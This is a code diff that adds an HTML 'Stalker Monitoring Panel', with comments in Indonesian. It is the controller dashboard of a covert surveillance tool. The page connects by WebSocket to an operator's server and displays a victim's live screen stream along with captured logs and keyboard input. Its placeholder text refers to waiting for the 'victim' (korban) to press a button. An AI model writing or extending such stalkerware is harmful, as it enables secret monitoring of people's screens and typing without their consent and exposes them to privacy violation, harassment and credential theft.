@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nebolusverse Stalker Panel</title>
+    <style>
+        body { background: #050505; color: #00ff66; font-family: monospace; padding: 15px; margin: 0; }
+        h1 { font-size: 18px; text-align: center; border-bottom: 1px solid #00ff66; padding-bottom: 10px; }
+        .container { display: flex; flex-direction: column; gap: 15px; }
+        .box { background: #111; border: 1px solid #00ff66; padding: 10px; border-radius: 4px; }
+        img { width: 100%; height: auto; border: 1px solid #ff0055; background: #000; }
+        ul { list-style: none; padding: 0; max-height: 150px; overflow-y: auto; font-size: 12px; }
+        li { border-bottom: 1px dashed #333; padding: 4px 0; }
+    </style>
+</head>
+<body>
+    <h1>✦ STALKER MONITORING PANEL ✦</h1>
+    <div class="container">
+        <div class="box">
+            <h3>[ LIVE SCREEN STREAM ]</h3>
+            <img id="screenView" alt="Menunggu korban menekan tombol..." />
+        </div>
+        <div class="box">
+            <h3>[ CAPTURED LOGS & INPUT ]</h3>
+            <ul id="logContainer"></ul>
+        </div>
+    </div>
+
+    <script>
+        // Masukkan URL WebSocket server lu di bawah ini dengan role=controller
+        const ws = new WebSocket('wss://nama-server-lu.glitch.me/?role=controller');
+
+        ws.onopen = () => {
+            addLog("Panel terhubung ke server utama.");
+        };
+
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            if (data.type === 'screen') {
+                document.getElementById('screenView').src = data.payload;
+            } else if (data.type === 'log') {
+                addLog(`[${data.time}] ${data.payload}`);
+            }
+        };
+
+        function addLog(text) {
+            const ul = document.getElementById('logContainer');
+            const li = document.createElement('li');
+            li.textContent = text;
+            ul.prepend(li);
+        }
+    </script>
+</body>
+</html>
